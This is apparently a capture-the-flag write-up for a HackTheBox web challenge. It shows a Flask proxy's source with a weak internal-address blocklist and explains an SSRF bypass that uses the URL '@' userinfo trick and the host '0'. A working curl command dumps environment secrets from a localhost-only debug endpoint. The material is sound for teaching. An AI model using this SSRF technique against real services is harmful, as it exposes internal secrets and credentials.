# Web

## Description

## Source

`blueprints/routes.py`
```python
from flask import Blueprint, request, Response, jsonify, redirect, url_for
from application.util import is_from_localhost, proxy_req
import random, os

SITE_NAME = 'reddit.com'

proxy_api = Blueprint('proxy_api', __name__)
debug     = Blueprint('debug', __name__)


@proxy_api.route('/', methods=['GET', 'POST'])
def proxy():
    url = request.args.get('url')

    if not url:
        cat_meme_subreddits = [
            '/r/cats/',
            '/r/catpictures',
            '/r/catvideos/'
        ]

        random_subreddit = random.choice(cat_meme_subreddits)

        return redirect(url_for('.proxy', url=random_subreddit))
    
    target_url = f'http://{SITE_NAME}{url}'
    response, headers = proxy_req(target_url)

    return Response(response.content, response.status_code, headers.items())

@debug.route('/environment', methods=['GET'])
@is_from_localhost
def debug_environment():
    environment_info = {
        'Environment variables': dict(os.environ),
        'Request headers': dict(request.headers)
    }

    return jsonify(environment_info)
```

`app.py`
```python
from flask import Flask, jsonify
from application.blueprints.routes import proxy_api, debug

app = Flask(__name__)
app.config.from_object('application.config.Config')

app.register_blueprint(proxy_api, url_prefix='/')
app.register_blueprint(debug, url_prefix='/debug')

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Not Found'}), 404

@app.errorhandler(403)
def forbidden(error):
    return jsonify({'error': 'Not Allowed'}), 403

@app.errorhandler(400)
def bad_request(error):
    return jsonify({'error': 'Bad Request'}), 400
```

`util.py`
```python
from flask import request, abort
import functools, requests

RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']

def is_safe_url(url):
    for restricted_url in RESTRICTED_URLS:
        if restricted_url in url:
            return False
    return True

def is_from_localhost(func):
    @functools.wraps(func)
    def check_ip(*args, **kwargs):
        if request.remote_addr != '127.0.0.1':
            return abort(403)
        return func(*args, **kwargs)
    return check_ip

def proxy_req(url):    
    method = request.method
    headers =  {
        key: value for key, value in request.headers if key.lower() in ['x-csrf-token', 'cookie', 'referer']
    }
    data = request.get_data()

    response = requests.request(
        method,
        url,
        headers=headers,
        data=data,
        verify=False
    )

    if not is_safe_url(url) or not is_safe_url(response.url):
        return abort(403)
    
    return response, headers
```
## Solution

Whenever we go to challenge url we are redirected to some random subreddit, that happens if `url` is not provided. 

Proxy url is hardcoded with `reddit.com` prefix and we can't really do anything about it, or can we? 
```python
SITE_NAME = 'reddit.com'
...
target_url = f'http://{SITE_NAME}{url}'
```

Because we are on HTTP protocol we can use `@` and URL becomes `http://reddit.com@evil.com` 

[RFC3986 > 3.2.1.  User Information](https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.1)

Protocol standards follow the format of: `scheme://[user:password@]host[:port]/path[?query][#fragment]`

Good, we bypassed the reddit prefix. How do we leak internal information?

![proxyasaservice.png](/assets/ctf/htb/web/proxyasaservice.png)

The debug endpoint has good endpoint that just dumps env and env contains the flag 👀
```python
@debug.route('/environment', methods=['GET'])
@is_from_localhost
def debug_environment():
```

There's restricted chunks of IP, but it doesn't contain `0` my favorite \\o/
```python
RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']
```

From `run.py` we know that app is running on port 1337 internally
```python
app.run(host='0.0.0.0', port=1337)
```

Get the env variables
```bash
└─$ curl http://83.136.252.88:42293/?url=@0:1337/debug/environment -s | jq .
{
  "Environment variables": {
    "FLAG": "HTB{fl4gs_4s_4_S3rv1c3}",
    "GPG_KEY": "7169605F62C751356D054A26A821E680E5FA6305",
    "HOME": "/root",
    "HOSTNAME": "ng-932570-webproxyasaservicemp-iflwa-859f74d678-j6ndh",
    "KUBERNETES_PORT": "tcp://10.128.0.1:443",
    "KUBERNETES_PORT_443_TCP": "tcp://10.128.0.1:443",
    "KUBERNETES_PORT_443_TCP_ADDR": "10.128.0.1",
    "KUBERNETES_PORT_443_TCP_PORT": "443",
    "KUBERNETES_PORT_443_TCP_PROTO": "tcp",
    "KUBERNETES_SERVICE_HOST": "10.128.0.1",
    "KUBERNETES_SERVICE_PORT": "443",
    "KUBERNETES_SERVICE_PORT_HTTPS": "443",
    "LANG": "C.UTF-8",
    "PATH": "/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "PYTHONDONTWRITEBYTECODE": "1",
    "PYTHON_GET_PIP_SHA256": "45a2bb8bf2bb5eff16fdd00faef6f29731831c7c59bd9fc2bf1f3bed511ff1fe",
    "PYTHON_GET_PIP_URL": "https://github.com/pypa/get-pip/raw/9af82b715db434abb94a0a6f3569f43e72157346/public/get-pip.py",
    "PYTHON_PIP_VERSION": "23.2.1",
    "PYTHON_VERSION": "3.12.0",
    "SUPERVISOR_ENABLED": "1",
    "SUPERVISOR_GROUP_NAME": "flask",
    "SUPERVISOR_PROCESS_NAME": "flask",
    "WERKZEUG_SERVER_FD": "3"
  },
  "Request headers": {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Host": "0:1337",
    "User-Agent": "python-requests/2.31.0"
  }
}
```

> Flag: `HTB{fl4gs_4s_4_S3rv1c3}`

